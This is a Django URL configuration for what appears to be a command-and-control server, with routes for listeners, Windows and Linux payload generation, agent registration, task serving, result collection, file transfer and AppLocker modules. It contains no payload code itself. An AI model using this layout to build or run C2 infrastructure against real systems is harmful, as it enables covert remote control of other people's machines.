from urllib import request
from django.urls import path
from . import views
from .Modules.windows import windowsModules
# from views import views.Listener

#ddasdx
#/sc/ddasdx
#/sc/
urlpatterns = [
    path('homePage/' , views.HomePage  , name='blog-home'),
    path('listeners/' , views.ListenersPage  , name='blog-listener'),
    path('start-listener/' , views.TestPage , name='blog-test'),
    path('postlistener/' , views.Listener.PostListener.as_view() , name='blog-listener'),
    path('payload-Gen/' , views.Listener.payloadGen.as_view() , name='blog-payload'),
    path('lin_payload-Gen/' , views.Listener.lin_payloadGen.as_view() , name='blog-lin_payload'),
    path('reg/' , views.registerAgent , name='blog-register'),
    path('tsks/' , views.Tasks  , name='blog-tasks'),
    path('sc/<eth>/',views.Listener.agent.sendScript,name='blog-sendScript'),
    path('download/<eth>/',views.Listener.agent.sendFile,name='blog-sendFile'),
    path('tasks/<name>/',views.Listener.agent.serveTasks,name='blog-serveTasks'),
    path('results/<name>/', views.Listener.agent.receiveResults , name='blog-result'),
    path('hackeruser/createuser/', views.HackerUser , name='blog-createuser'),
    path('launcher/', views.Launcher , name='blog-Launcher'),
    path('Lin-results/<name>/', views.Listener.agent.LinreceiveResults , name='blog-Linresult'),
    path('upload/', views.upload_file , name='blog-upload'),
    path('tasksApi/<int:type>/', views.TasksApi.as_view()),
    path('directorylist/' , windowsModules.DirectoryListing),
    path('applocker/' , windowsModules.Applocker),
    
    # path('results/{}'.format(Listener.name) , views.receiveResults , name='blog-result'),
]

